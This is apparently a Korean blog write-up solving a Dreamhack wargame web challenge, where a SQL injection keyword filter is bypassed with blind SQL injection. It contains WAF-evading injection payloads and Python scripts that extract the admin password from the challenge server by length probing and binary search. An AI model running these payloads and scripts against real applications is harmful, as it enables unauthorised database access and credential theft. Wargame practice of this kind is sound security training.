---
title: "드림핵 lv.2 - sql injection bypass WAF Advanced"
date: 2025-03-03 00:20:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, sql injection, WAF, bypass] 
description: 드림핵 sql injection bypass WAF Advanced 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/416](https://dreamhack.io/wargame/challenges/416)
# 문제 설명
Exercise: SQL Injection Bypass WAF의 패치된 문제입니다.

---
# 문제 풀이
[https://hoonsooni.com/posts/dreamhack_sql_injection_bypass_WAF](https://hoonsooni.com/posts/dreamhack_sql_injection_bypass_WAF)<br />
이번 문제는 이 전에 풀었던 문제와 상당 부분 일치하는 문제이다. 그래서 웹사이트 분석은 생략해도 될 것 같다.
## 코드 분석
### app.py
```python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']

def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False
```
코드 또한 거의 대부분이 똑같다. 하지만 문제에서 설명했듯 WAF 우회 취약점이 패치된 상황이라고 한다.<br />

그래서 달라진 부분만 가져와봤다. 필터링할 키워드가 늘어나있는 것이 보인다.<br />
이 전에는 쿼리에 필요한 공백 문자를 `\n`이나 `\t`로 대체할 수 있었는데 이 부분이 완전히 막혀버렸다. <br />

여기에 추가적으로 if문을 보면 data.lower() 함수 때문에 이 전처럼 "union"을 "UniON"같은 것으로 우회하는 길도 막혔다.
## 최종 풀이
```sql
' UnION SeLecT null,upw,null FroM user WHERE uid='AdMiN' --
```
이 전에 사용했던 쿼리이다. 이제 이것들을 하나씩 우회하는 방법을 찾아봐야 하는데 그런 방식으로는 해결이 안될 것 같다.<br />

아무리 생각해도 쿼리가 생각이 나지를 않아서 방향을 바꿔보기로 했다. Blind SQL Injection을 이용한 방법이다.<br />
### 테스트 쿼리
```sql
'||uid=reverse("nimda")&&if(ascii(substr(upw,1,1))=0x44,1,0)#
```
우선 쿼리를 하나 작성하고 작동하는지 테스트를 해봐야한다.<br />
우선 admin 조차 입력할 수 없으니까 reverse를 통해서 uid가 admin값을 가지는지 확인하고 ascii()와 substr() 함수들을 통해서 비밀번호의 한 글자 한 글자를 체크하는 식으로 진행해야 한다.<br />

추가적으로 신경써야 할 점은, 이 전 쿼리에선 주석 처리를 '--'로 하고 있는데 '-' 기호도 막혀버려서 '#'으로 대체했다.
### 비밀번호 길이 구하기
비밀번호를 구하기 이전에 길이부터 알아야한다.<br />
```sql
'||uid=reverse("nimda")&&length(upw)=15#
```
테스트 쿼리를 작성해주고 uid 인풋 박스에 넣어서 제출하면 WAF 혹은 인터널 에러가 발생하지는 않는 것을 보면 쿼리는 잘 작동하는 듯 하다.<br />

```python
import requests

port = "14719"
url = f"http://host1.dreamhack.games:{port}/?uid="

length = 0

for len in range(1, 50):
    query = f"'||uid%3Dreverse('nimda')%26%26length(upw)%3D{str(len)}%23"
    resp = requests.get(f"{url}{query}")

    if "admin" in resp.text:
        length = len
        break

print(length)
```
이제 해당 쿼리를 적절히 인코딩하여 반복문을 돌려주면 비밀번호의 길이(44)를 알 수 있다.
### 비밀번호 구하기
```python
import requests

port = "20254"
url = f"http://host1.dreamhack.games:{port}/?uid="

length = 44

pw = ""

for i in range(1, length + 1):
    left = 32
    right = 126

    while left <= right:
        mid = (left + right) // 2
        query = f"'||uid%3Dreverse('nimda')%26%26if(ascii(substr(upw%2C{i}%2C1))>{str(mid)}%2C1%2C0)%23"

        resp = requests.get(f"{url}{query}")

        if "admin" in resp.text:
            left = mid + 1
        else:
            right = mid - 1
        
    pw += chr(left)
    print(pw)
```
해당 코드를 실행하고 조금만 기다리면 최종 비밀번호, 즉 플래그를 얻게된다.<br />
보통 플래그는 출력이 가능한 ascii 문자로 이루어져 있기 때문에 32(' ')부터 126('~')까지 돌아가면서 맞는 비밀번호를 찾는 원리이다.<br />

비밀번호의 길이는 44이고 126 - 32만큼 반복을 돌면 총 44 * 94번을 반복해야 하기 때문에 상당히 오래걸린다. *단순 연산으로만 따지면 컴퓨터 입장에선 별 거 아니지만 HTTP 요청 연산으로 저 만큼의 반복을 수행하면 꽤나 시간이 걸린다.*<br />

그래서 이진 탐색 방식으로 각 문자를 찾는데 걸리는 연산을 최대 7번으로 줄일 수 있다.
# 배운 것
어떠한 공격을 막았다면 그것을 우회하는 데에는 생각보다 많은 변화가 필요하다는 것을 알았다.<br />